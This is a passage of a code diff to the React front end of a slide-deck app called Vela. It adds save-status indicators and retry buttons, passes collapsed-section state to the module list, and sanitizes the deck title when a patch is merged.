+          <button data-testid="save-failed-toast-retry" onClick={() => { try { if (window.__velaForceSave) window.__velaForceSave(); } catch {} setSaveFailToast(false); }} style={{ padding: "4px 12px", background: T.red, color: "#fff", border: "none", borderRadius: 5, fontFamily: FONT.mono, fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Retry</button>
+        </div>
+      </div>}
+
       {/* ── TOP BAR — title left, actions right, dropdown buttons ── */}
       {!state.fullscreen && <header style={{ padding: isMobile ? "6px 10px" : "0 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: isMobile ? 8 : 10, background: T.bgPanel, flexShrink: 0, height: isMobile ? 40 : 44 }}>
         {/* Left: icon + title + time */}
         {isMobile && mobileTab !== "list" && <button onClick={() => { setMobileTab("list"); if (mobileTab === "slides") dispatch({ type: "DESELECT" }); }} style={S.btn({ padding: "2px 4px", color: T.accent, fontSize: 16 })}>{"←"}</button>}
         <span onClick={() => { if (typeof window !== "undefined" && typeof window.__velaOpenDeckPicker === "function") { window.__velaOpenDeckPicker(); } else { setShowChangelog(true); } }} style={{ cursor: "pointer", display: "flex", alignItems: "center" }} title={typeof window !== "undefined" && typeof window.__velaOpenDeckPicker === "function" ? "Open deck (Ctrl+O)" : "About"}><VelaIcon size={20} /></span>
+        {/* Desktop save-status pill — beside the sail icon so "which file + is it saved" read together. Hidden unless the desktop shell emits a status. */}
+        {!isMobile && saveStatus && (() => {
+          // Payload from the desktop shell is {state, at, name}: a file BASENAME, no
+          // absolute path and no raw platform error (those stay shell-side).
+          const st = saveStatus.state;
+          const at = saveStatus.at;
+          const nm = saveStatus.name ? String(saveStatus.name) : "";
+          const forFile = nm ? ` ${nm}` : " your file";
+          const timeStr = at ? (() => { try { return new Date(at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }); } catch { return ""; } })() : "";
+          const base = { display: "flex", alignItems: "center", gap: 4, padding: "2px 8px", borderRadius: 4, fontFamily: FONT.mono, fontSize: 11, fontWeight: 600, whiteSpace: "nowrap", flexShrink: 0, userSelect: "none" };
+          if (st === "saved") return <span data-testid="save-status-pill" data-save-state="saved" title={`Saved${nm ? " to " + nm : ""}${timeStr ? " at " + timeStr : ""}`} style={{ ...base, color: T.textDim, cursor: "default" }}>{"✓"} Saved</span>;
+          if (st === "saving") return <span data-testid="save-status-pill" data-save-state="saving" title={`Saving to${forFile}…`} style={{ ...base, color: T.textMuted, cursor: "default" }}>{"⟳"} Saving…</span>;
+          // Written, but the shell could not read the bytes back to confirm them.
+          // Shown distinctly rather than as a confident "Saved" the user can't rely on.
+          if (st === "unverified") return <span data-testid="save-status-pill" data-save-state="unverified" title={`Written to${forFile}, but Vela couldn't read it back to confirm. Keep a backup if this persists.`} style={{ ...base, color: T.amber, background: T.amber + "18", cursor: "default" }}>{"✓?"} Saved (unverified)</span>;
+          if (st === "reconnecting") return <span data-testid="save-status-pill" data-save-state="reconnecting" title="Lost the connection to your file — reconnecting. Restart Vela if this persists." style={{ ...base, color: T.amber, background: T.amber + "18", cursor: "default" }}>{"◍"} Reconnecting…</span>;
+          // failed
+          return <span data-testid="save-status-pill" data-save-state="failed" role="button" onClick={() => { try { if (window.__velaForceSave) window.__velaForceSave(); } catch {} }} title={`Vela couldn't write to${forFile} — click to retry`} style={{ ...base, color: T.red, background: T.red + "18", cursor: "pointer" }}><span style={{ fontFamily: FONT.mono, fontSize: 9, color: T.red }}>●</span> <span data-testid="save-status-retry">Couldn't save — Retry</span></span>;
+        })()}
         {editingTitle ? (
           <input autoFocus value={titleDraft} onChange={(e) => setTitleDraft(e.target.value)}
             onKeyDown={(e) => { if (e.key === "Enter") commitTitle(); if (e.key === "Escape") setEditingTitle(false); }}
@@ -18958,7 +20822,7 @@ export default function App() {
               </div>
             </div>
           )}
-          {total > 0 && <ModuleList lanes={state.lanes} selectedId={state.selectedId} slideIndex={state.slideIndex} selectedSlideIndices={state.selectedSlideIndices} dispatch={dispatch} maxModuleTime={maxModuleTime} guidelines={state.guidelines} reviewMode={state.reviewMode} />}
+          {total > 0 && <ModuleList lanes={state.lanes} selectedId={state.selectedId} slideIndex={state.slideIndex} selectedSlideIndices={state.selectedSlideIndices} collapsedSections={state.collapsedSections} dispatch={dispatch} maxModuleTime={maxModuleTime} guidelines={state.guidelines} reviewMode={state.reviewMode} />}
         </div>}
 
         {/* TOC toggle */}
@@ -19063,7 +20927,7 @@ export default function App() {
         if (result) {
           const patchId = result._lastPatchId || "";
           delete result._lastPatchId;
-          try { const s = validateAndSanitizeDeck(result); s.deckTitle = result.deckTitle; s._lastPatchId = patchId; dispatch({ type: "LOAD", payload: s }); dispatch({ type: "DESELECT" }); selectFirstModule(); } catch(e) { /* fail closed: do not load the raw merged deck if sanitization fails */ dbg("[PATCH] Merge sanitize failed, not loading raw:", e); }
+          try { const s = validateAndSanitizeDeck(result); s.deckTitle = sanitizeDeckTitle(result.deckTitle); s._lastPatchId = patchId; dispatch({ type: "LOAD", payload: s }); dispatch({ type: "DESELECT" }); selectFirstModule(); } catch(e) { /* fail closed: do not load the raw merged deck if sanitization fails */ dbg("[PATCH] Merge sanitize failed, not loading raw:", e); }
         } else {
           // User skipped — store current patchId so we don't ask again
           if (STARTUP_PATCH?._patchId) {
@@ -19074,8 +20938,7 @@ export default function App() {
           }
         }
       }} />}
-      {!VELA_PRESENTATION_MODE && <VelaBatteryTest />}
-      {!VELA_PRESENTATION_MODE && <VelaUITestRunner />}
+      {devTestPanels}
       {!VELA_PRESENTATION_MODE && <VelaDemoRunner />}
     </div>
     </IconPickerContext.Provider>
